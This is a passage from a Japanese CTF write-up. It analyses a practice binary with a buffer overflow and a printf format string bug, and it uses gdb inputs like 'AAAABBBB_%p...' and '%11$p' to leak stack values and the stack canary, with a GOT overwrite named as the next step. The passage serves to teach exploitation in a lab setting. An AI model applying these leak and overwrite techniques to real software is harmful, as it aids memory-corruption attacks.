    style="padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABmklEQVQoz02Q7W/SABDGGzOdA536wdeFwdoyoFBaaJkTyssYMmBjvBSoGyDMzJj4/3//eS0m+uGXe3K5e57LKe3TFu5hhknpimV9SvDllsXnG9GTqPZO69x7Y4LzIWPrK3PpTcp9VjJ7W+ywvQz42V+xbvrRvOK+ydNOnsnShKXQSlRoHDlcSG/Z8Pl1s+Wxv2bTDth2vnFf93nsrVg1ZvQydWrvbeqfyngf7GhHMZ4kmFUGPMjwpr2IzIy9YyHJ3G4SOB18s0FPdRno5wx1h6lRxbeaeB/LmM9Sfzmh8DSJEoproyWJU75fzBnkmlgHGlZMp3qUpZbI4qUMWc5SfpehpZt4ap6z1xqFvRSluI4d+0dk2M82+dG9Y2x3owtDQ/u5hmG65A25uOBSODYxVQsj75BP25jxdBRqHeyMwhqihGeO5Nl31RHm/klElCampVyZ0tscTraEbYgWoxBXwioxDVfmHKk7Uy1CKe6rXKU9fo8e6Oo1+UNqlyjM4irtuIb/QuMypnIteiE6ONTYvNJYSx2+1Cj+Z/gHZW/dwTkz9AUAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/c9dc109b3c5b4ba18e2047fe722a8469/8ac56/image-20240604211454156.webp 240w,
/static/c9dc109b3c5b4ba18e2047fe722a8469/65f07/image-20240604211454156.webp 371w"
              sizes="(max-width: 371px) 100vw, 371px"
              type="image/webp"
            />
          <source
            srcset="/static/c9dc109b3c5b4ba18e2047fe722a8469/8ff5a/image-20240604211454156.png 240w,
/static/c9dc109b3c5b4ba18e2047fe722a8469/d4635/image-20240604211454156.png 371w"
            sizes="(max-width: 371px) 100vw, 371px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/c9dc109b3c5b4ba18e2047fe722a8469/d4635/image-20240604211454156.png"
            alt="image-20240604211454156"
            title="image-20240604211454156"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>プログラムのデコンパイル結果を読むと、<code class="language-text">fgets(&amp;var_38, 0x42, stdin);</code> で最大 0x42 バイト分の入力を受け取って RBP-0x30 に格納しています。</p>
<p>つまり、ここにはバッファオーバーフローの脆弱性があります。</p>
<p>また、<code class="language-text">printf(&amp;var_38);</code>では受け取った入力を printf で出力しており、フォーマット文字列攻撃も可能であることがわかります。</p>
<p>ここまでの確認結果から、この問題ではフォーマット文字列攻撃を利用して Canary をリークして BoF 攻撃を成功させたり、GOT オーバーライドによって任意のアドレスのコードを実行したりすることで Flag を取得できると予想できます。</p>
<h2 id="フォーマット文字列攻撃の基本と実践" style="position:relative;"><a href="#%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%83%E3%83%88%E6%96%87%E5%AD%97%E5%88%97%E6%94%BB%E6%92%83%E3%81%AE%E5%9F%BA%E6%9C%AC%E3%81%A8%E5%AE%9F%E8%B7%B5" aria-label="フォーマット文字列攻撃の基本と実践 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>フォーマット文字列攻撃の基本と実践</h2>
<p>フォーマット文字列攻撃を実践するために、まずは以下の神記事の内容を中心に FSB(Format String Bug) の悪用の典型を押さえておくことにします。</p>
<p>参考：<a href="https://ptr-yudai.hatenablog.com/entry/2018/10/06/234120" target="_blank" rel="nofollow noopener noreferrer">Format String Exploitを試してみる - CTFするぞ</a></p>
<p>参考：<a href="https://book.hacktricks.xyz/v/jp/binary-exploitation/format-strings" target="_blank" rel="nofollow noopener noreferrer">Format Strings | Japanese - Ht | HackTricks</a></p>
<h3 id="fsb-とは" style="position:relative;"><a href="#fsb-%E3%81%A8%E3%81%AF" aria-label="fsb とは permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>FSB とは</h3>
<p>FSB は、printf や sprintf、fprintf などの関数の最初の引数にフォーマッタを含む攻撃者のテキストを入力可能なプログラムの脆弱性を指します。</p>
<p>今回の問題バイナリでは、ユーザが入力したデータが <code class="language-text">printf(&amp;var_38);</code> にて printf 関数の引数として与えられているため、FSB の脆弱性が存在すると判断できます。</p>
<p>printf などの関数では、以下のようなフォーマッタを使用できます。</p>
<p>フォーマッタは % 記号、フラグ、変換文字列の長さを指定する 10 進数文字列、変換指定子などで構成されます。</p>
<p>以下は、一般的な変換指定子とその用途です。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token operator">%</span>d —<span class="token operator">></span> <span class="token keyword">int</span><span class="token punctuation">(</span>Decimal<span class="token punctuation">)</span>
<span class="token operator">%</span>u —<span class="token operator">></span> Unsigned <span class="token keyword">int</span><span class="token punctuation">(</span>Decimal<span class="token punctuation">)</span>
<span class="token operator">%</span>x —<span class="token operator">></span> Unsigned <span class="token keyword">int</span><span class="token punctuation">(</span>Hex<span class="token punctuation">)</span>
<span class="token operator">%</span><span class="token number">08</span>x —<span class="token operator">></span> <span class="token number">8</span> hex bytes
<span class="token operator">%</span>f <span class="token operator">-></span> <span class="token keyword">double</span><span class="token punctuation">(</span>Decimal<span class="token punctuation">)</span>
<span class="token operator">%</span>c <span class="token operator">-></span> Unsigned <span class="token keyword">char</span>
<span class="token operator">%</span>s —<span class="token operator">></span> String
<span class="token operator">%</span>p —<span class="token operator">></span> Pointer
<span class="token operator">%</span>n —<span class="token operator">></span> Number of written bytes to pointer
<span class="token operator">%</span>hn —<span class="token operator">></span> Occupies <span class="token number">2</span> bytes instead of <span class="token number">4</span>
<span class="token operator">&lt;</span>n<span class="token operator">></span>$X —<span class="token operator">></span> Direct access<span class="token punctuation">,</span> Example<span class="token operator">:</span> <span class="token punctuation">(</span><span class="token string">"%3$d"</span><span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">)</span> —<span class="token operator">></span> Access to var3</code></pre></div>
<p>参考：<a href="https://www.k-cube.co.jp/wakaba/server/func/fprintf.html" target="_blank" rel="nofollow noopener noreferrer">fprintf()</a></p>
<p>特に f、c、s、p 以外の整数を扱う変換指定子の場合、以下の長さ修飾子を <code class="language-text">%hhn</code> のように使用することで引数に渡した値を指定した長さの通りに扱うことができます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">hh -<span class="token operator">></span> <span class="token number">1</span> byte<span class="token punctuation">(</span>harf-half<span class="token punctuation">)</span>
h -<span class="token operator">></span> <span class="token number">2</span> byte<span class="token punctuation">(</span>harf<span class="token punctuation">)</span>
l -<span class="token operator">></span> <span class="token number">8</span> byte<span class="token punctuation">(</span>long<span class="token punctuation">)</span></code></pre></div>
<p>このようなフォーマッタを使用し、<code class="language-text">printf(&amp;var_38);</code> のように printf の第 1 引数をユーザがコントロールできる場合には FSB を悪用してスタックやメモリ内のデータをリークしたり、任意のデータを改ざんすることが可能になります。</p>
<p>このような悪用が可能な理由は、printf や sprintf、fprintf などの関数は可変長引数を取るため、関数側では実際にいくつの引数を与えられているか判断できないためです。</p>
<p>そのため、関数は第 1 引数のフォーマット文字列の数だけレジスタやスタックの値を表示しようとします。(%n を使用する場合は出力した文字数を引数のポインタに書き込みます)</p>
<p>FSB を利用した具体的な悪用方法は後述します。</p>
<h3 id="fsb-で出力可能な値" style="position:relative;"><a href="#fsb-%E3%81%A7%E5%87%BA%E5%8A%9B%E5%8F%AF%E8%83%BD%E3%81%AA%E5%80%A4" aria-label="fsb で出力可能な値 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>FSB で出力可能な値</h3>
<p>CTF で FSB を悪用する場合、埋め込んだフォーマッタが実際にどのレジスタやスタックの値を参照するのかを事前に把握しておく必要があります。</p>
<p>Linux の x64 呼び出し規約の場合、各引数は通常、以下に格納されます。</p>
<table>
<thead>
<tr>
<th align="center">引数</th>
<th align="center">格納先</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center">第 1 引数</td>
<td align="center">RDI</td>
</tr>
<tr>
<td align="center">第 2 引数</td>
<td align="center">RSI</td>
</tr>
<tr>
<td align="center">第 3 引数</td>
<td align="center">RDX</td>
</tr>
<tr>
<td align="center">第 4 引数</td>
<td align="center">RCX</td>
</tr>
<tr>
<td align="center">第 5 引数</td>
<td align="center">R8</td>
</tr>
<tr>
<td align="center">第 6 引数</td>
<td align="center">R9</td>
</tr>
<tr>
<td align="center">第 7 引数以降</td>
<td align="center">スタックアドレス</td>
</tr>
</tbody>
</table>
<p>第 1 引数にはフォーマッタが格納されるため、フォーマットストリング攻撃では基本的に第 2 引数以降のレジスタの値を順に参照していき、6 つ目のフォーマッタからスタックの情報を参照するようになります。(この時のスタックトップには多くの場合第 1 引数に格納されるフォーマッタを含むテキストが入ります)</p>
<p>実際にこの挙動を gdb で確認してみます。</p>
<p>今回の問題バイナリ og で FSB を悪用できるのは以下の箇所です。</p>
<p>スタック領域の RBP-0x30 には事前にユーザ入力から与えられたフォーマッタを含む文字列が格納されています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/2c28c9c59afffb47d928409b6876fa2a/0b533/image-20240606214521784.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 16.249999999999996%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQI1x2M0U6DMBhGeRwKhlEsHS2DiSuwLIsoXaIz8UKzxEcwPv2x9uLk/H/y5STtoaN1HZWuUEphjKEsS9I0RQgRLLDWUkmJyDJ0uO9Vjen7gMX2LXqrqbc1UpYk/TywPw6oRmEbw7B/CG5iIM/zyG7Xxf+uKDBdj25NCDchIFG6ZrMpyEQWt8n6fmG9ek7PZ77frvx83vj9uvGxeh6dYxxHvPcsTwvzPPF6WfAvZ+bjjDu4yP9mmqboP+lwZwq1M/YtAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/2c28c9c59afffb47d928409b6876fa2a/8ac56/image-20240606214521784.webp 240w,
/static/2c28c9c59afffb47d928409b6876fa2a/d3be9/image-20240606214521784.webp 480w,
/static/2c28c9c59afffb47d928409b6876fa2a/b0a15/image-20240606214521784.webp 500w"
              sizes="(max-width: 500px) 100vw, 500px"
              type="image/webp"
            />
          <source
            srcset="/static/2c28c9c59afffb47d928409b6876fa2a/8ff5a/image-20240606214521784.png 240w,
/static/2c28c9c59afffb47d928409b6876fa2a/e85cb/image-20240606214521784.png 480w,
/static/2c28c9c59afffb47d928409b6876fa2a/0b533/image-20240606214521784.png 500w"
            sizes="(max-width: 500px) 100vw, 500px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/2c28c9c59afffb47d928409b6876fa2a/0b533/image-20240606214521784.png"
            alt="image-20240606214521784"
            title="image-20240606214521784"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>実際に 0x401239 にブレークポイントを設定して <code class="language-text">AAAABBBB_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p</code> という文字列を入力した場合のデバッグを行います。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">b *0x401239
r
<span class="token comment"># AAAABBBB_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p を入力</span></code></pre></div>
<p>この時 printf で出力されたのは <code class="language-text">AAAABBBB_0x7fffffffba20_(nil)_0x7ffff7e9a887_0x1a_(nil)_0x4242424241414141_0x255f70255f70255f_0x5f70255f70255f70_0x70255f70255f7025_0xa70255f70255f</code> というテキストでした。</p>
<p>AAAABBBB は入力値がそのまま出力されていますが、<code class="language-text">0x7fffffffba20_(nil)_0x7ffff7e9a887_0x1a_(nil)</code> までの範囲には第 2 引数の RSI レジスタから R9 レジスタまでの値が順に格納されています。(<code class="language-text">%p</code> による出力のため、0 の値は (nil) として表示されます)</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/42f9e2326fff73ecc5c79ddf5be5862d/3f8aa/image-20240606220230900.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 26.25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAuElEQVQY06WOywqCYBCF3WVtIm9ZYVAZlKW/Yt5+K10ZBJWL3v9VTqOGi+iyaHE4cGbmmyNcRi7uboF8GsLpzOD2zI9i3cXXeSXhZvi4rjKkugdHnLeH7/QLVgNLM8F5yREMrBb4j4SDFCEZZyi9E44TH7G8QSxZiKQtuMYQ9NfYU/uqYfWQidT2xau8ntGOUOg7OgiQGwG5i1DxEOmcgASWG2is2EhUhnTIyO0645oDrjrPrPGI9h9UtI559wJMPwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/42f9e2326fff73ecc5c79ddf5be5862d/8ac56/image-20240606220230900.webp 240w,
/static/42f9e2326fff73ecc5c79ddf5be5862d/d3be9/image-20240606220230900.webp 480w,
/static/42f9e2326fff73ecc5c79ddf5be5862d/e46b2/image-20240606220230900.webp 960w,
/static/42f9e2326fff73ecc5c79ddf5be5862d/c6c08/image-20240606220230900.webp 1337w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/42f9e2326fff73ecc5c79ddf5be5862d/8ff5a/image-20240606220230900.png 240w,
/static/42f9e2326fff73ecc5c79ddf5be5862d/e85cb/image-20240606220230900.png 480w,
/static/42f9e2326fff73ecc5c79ddf5be5862d/d9199/image-20240606220230900.png 960w,
/static/42f9e2326fff73ecc5c79ddf5be5862d/3f8aa/image-20240606220230900.png 1337w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/42f9e2326fff73ecc5c79ddf5be5862d/d9199/image-20240606220230900.png"
            alt="image-20240606220230900"
            title="image-20240606220230900"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>そして、それ以降の <code class="language-text">0x4242424241414141_0x255f70255f70255f_0x5f70255f70255f70_0x70255f70255f7025_0xa70255f70255f</code> からスタックの値が順に出力されていることがわかります。</p>
<p>gdb でこのタイミングの RBP-0x30 以降のスタック領域を参照すると、printf でリークした値と一致することがわかります。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 555px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/a672b4d406e309e467697fa06205ed4e/cd039/image-20240606220444467.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 14.583333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0ElEQVQI1yWOWWvCUBBG9UGkUKtN1FYQKlpiU5egdQta1NAGQ6OGuuCCCq1oUfz/j6c314ePM8MwMyfwcVfgM6LTS1RxKy6eYbMwRyzbHpM3h3pMp6EUqEVfMG5yVG81mqJvxUu01KKMKep67FXOA5o6JK86aPEhueQU67nPwVlzdHeCG8k/Ef+JHkxjZZqcxj8cv7acvSsv33tmDZdyOCsOKjb5+z6aMiCrenQz7/LgfrDm116xs+Zyybcthp6kafvBoPNYwUyU6aSu9C19w3+aYWOcmP4pwgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/a672b4d406e309e467697fa06205ed4e/8ac56/image-20240606220444467.webp 240w,
/static/a672b4d406e309e467697fa06205ed4e/d3be9/image-20240606220444467.webp 480w,
/static/a672b4d406e309e467697fa06205ed4e/2e9dd/image-20240606220444467.webp 555w"
              sizes="(max-width: 555px) 100vw, 555px"
              type="image/webp"
            />
          <source
            srcset="/static/a672b4d406e309e467697fa06205ed4e/8ff5a/image-20240606220444467.png 240w,
/static/a672b4d406e309e467697fa06205ed4e/e85cb/image-20240606220444467.png 480w,
/static/a672b4d406e309e467697fa06205ed4e/cd039/image-20240606220444467.png 555w"
            sizes="(max-width: 555px) 100vw, 555px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/a672b4d406e309e467697fa06205ed4e/cd039/image-20240606220444467.png"
            alt="image-20240606220444467"
            title="image-20240606220444467"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>また、多くの場合 $ 記号による変換指定を使用する場合、特定の位置の引数を明示的に指定することも可能です。</p>
<p>例えば、<code class="language-text">AAAABBBB_%6$p</code> という入力を与えた場合、<code class="language-text">%6$p</code> によって 6 番目の出力(printf の引数が格納されるスタックアドレス)の値のみを print することも可能です。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 545px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/57f5c81425c91cb147b4681a3fb20ff6/3ddad/image-20240606221024478.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 11.249999999999998%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAlklEQVQI1x3KzQ+BcACA4a4OmIuNA5nN0IfqZ4kUlaUYLYrNHGw2N///8dWcnssj+ZMVa2VFsknxtDW+6rIZLFnKPk7fwxvtsLsLttM9iTj/DZUEtWUwratMGjpWW+B3TELZQSrmBwqRUlaelJCrlZAbMTf7yN05cTFjHm7GN3/zSZ+8wvJvpkfVD8i0iKBnI5pjZrUhP+INQ72MF6XfAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/57f5c81425c91cb147b4681a3fb20ff6/8ac56/image-20240606221024478.webp 240w,
/static/57f5c81425c91cb147b4681a3fb20ff6/d3be9/image-20240606221024478.webp 480w,
/static/57f5c81425c91cb147b4681a3fb20ff6/6305f/image-20240606221024478.webp 545w"
              sizes="(max-width: 545px) 100vw, 545px"
              type="image/webp"
            />
          <source
            srcset="/static/57f5c81425c91cb147b4681a3fb20ff6/8ff5a/image-20240606221024478.png 240w,
/static/57f5c81425c91cb147b4681a3fb20ff6/e85cb/image-20240606221024478.png 480w,
/static/57f5c81425c91cb147b4681a3fb20ff6/3ddad/image-20240606221024478.png 545w"
            sizes="(max-width: 545px) 100vw, 545px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/57f5c81425c91cb147b4681a3fb20ff6/3ddad/image-20240606221024478.png"
            alt="image-20240606221024478"
            title="image-20240606221024478"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>この方法を応用することで、printf の引数が格納されるスタックアドレスから大きく離れたアドレスの値をリークすることもできるようになります。</p>
<h3 id="fsb-で-canary-をリークする" style="position:relative;"><a href="#fsb-%E3%81%A7-canary-%E3%82%92%E3%83%AA%E3%83%BC%E3%82%AF%E3%81%99%E3%82%8B" aria-label="fsb で canary をリークする permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>FSB で Canary をリークする</h3>
<p>続いて、FSB で任意の Canary の値をリークしていきます。</p>
<p>Canary は通常各関数のプロローグでスタックに保存されるので、FSB で容易にリークすることが可能です。</p>
<p>今回の問題バイナリの場合、Canary は go 関数内で RBP-0x8 のアドレスに格納されています。</p>
<p>FSB の悪用に使用するフォーマッタが格納されている RBP-0x30 のアドレスには <code class="language-text">%6$p</code> でアクセスできるので、Canary が格納されるスタック領域には <code class="language-text">(0x30-0x8)//0x8 = 5</code> を加算した <code class="language-text">%11$p</code> でアクセスできます。</p>
<p>実際にこの入力を与えることで go 関数内のスタックから Canary をリークできます。(Canary の値はプログラムを実行する度にランダムに設定されます)</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 544px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/1b2c8813f137fc77ece064e1f32cac8c/b3e51/image-20240606222639190.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 11.249999999999998%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAk0lEQVQI10WLOQ6CQAAA6YwWSGNiLEBjjAfCEpQjcniAupoonrGg9v9PGLezmEwxGS13UpL5isNaEk8jtiIjMWPCfk5kZaSjHctezMaWiE7AWHeZ6IJZ28U2lA2PoBtQWCEbM0SrsztPX/KJLlROyXt5phJ7nosTD/+okNTpja+seal2dQoqt2SnZrcxwGsNEc0/P1DeQNhrsmBYAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/1b2c8813f137fc77ece064e1f32cac8c/8ac56/image-20240606222639190.webp 240w,
/static/1b2c8813f137fc77ece064e1f32cac8c/d3be9/image-20240606222639190.webp 480w,
/static/1b2c8813f137fc77ece064e1f32cac8c/cd5ab/image-20240606222639190.webp 544w"
              sizes="(max-width: 544px) 100vw, 544px"
              type="image/webp"
            />
          <source
            srcset="/static/1b2c8813f137fc77ece064e1f32cac8c/8ff5a/image-20240606222639190.png 240w,
/static/1b2c8813f137fc77ece064e1f32cac8c/e85cb/image-20240606222639190.png 480w,
/static/1b2c8813f137fc77ece064e1f32cac8c/b3e51/image-20240606222639190.png 544w"
            sizes="(max-width: 544px) 100vw, 544px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/1b2c8813f137fc77ece064e1f32cac8c/b3e51/image-20240606222639190.png"
            alt="image-20240606222639190"
            title="image-20240606222639190"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span> </p>
<p>しかし、状況によっては BoF によってスタックを破壊してしまっている場合など、go 関数内の RBP-0x8 のアドレスから Canary を取得できない場合があります。</p>
<p>以下は Canary を破壊してしまっているために <code class="language-text">%11$p</code> の出力結果が 0x4141414141414141 となってしまっている例です。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/1d93e971766ec7132fc9fecba94c414c/c2d9c/image-20240606222828946.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 5.833333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAUElEQVQI10XD3QpAMACAUQ8hyT0p5veCtDXZjCly4f1f5ePOqRP43mIKhck0SzazlQ5f7RzfZzi5m5VTGK7Kcom/zzUulci4ZYpqxlCgko4XVNIhlIDAt7cAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/1d93e971766ec7132fc9fecba94c414c/8ac56/image-20240606222828946.webp 240w,
/static/1d93e971766ec7132fc9fecba94c414c/d3be9/image-20240606222828946.webp 480w,
/static/1d93e971766ec7132fc9fecba94c414c/e46b2/image-20240606222828946.webp 960w,
/static/1d93e971766ec7132fc9fecba94c414c/bfc0a/image-20240606222828946.webp 1326w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/1d93e971766ec7132fc9fecba94c414c/8ff5a/image-20240606222828946.png 240w,
/static/1d93e971766ec7132fc9fecba94c414c/e85cb/image-20240606222828946.png 480w,
/static/1d93e971766ec7132fc9fecba94c414c/d9199/image-20240606222828946.png 960w,
/static/1d93e971766ec7132fc9fecba94c414c/c2d9c/image-20240606222828946.png 1326w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/1d93e971766ec7132fc9fecba94c414c/d9199/image-20240606222828946.png"
            alt="image-20240606222828946"
            title="image-20240606222828946"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>このような場合には、FSB の悪用が可能な関数内の printf が参照しているスタックアドレスより深いアドレスのスタックに保存される Canary をターゲットにするとリークが可能になります。</p>
<p>今回の場合はまず、go 関数内にブレークポイントを設定して、TSL(<code class="language-text">fs:0x28</code>) から取得してきた Canary の値(0xba2d86a755c0c400) を確認し、<code class="language-text">searchmem 0xba2d86a755c0c400</code> にて他のスタック領域に Canary が埋め込まれていないかを調べます。</p>
<p>すると、以下のように go 関数の RSP が指すアドレスより深いアドレスにある 0x7fffffffdc18 にも Canary  と同じ値が埋め込まれていることがわかりました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 470px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/65ff40ee840bb33a43112da2963c5686/f96db/image-20240606230423319.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
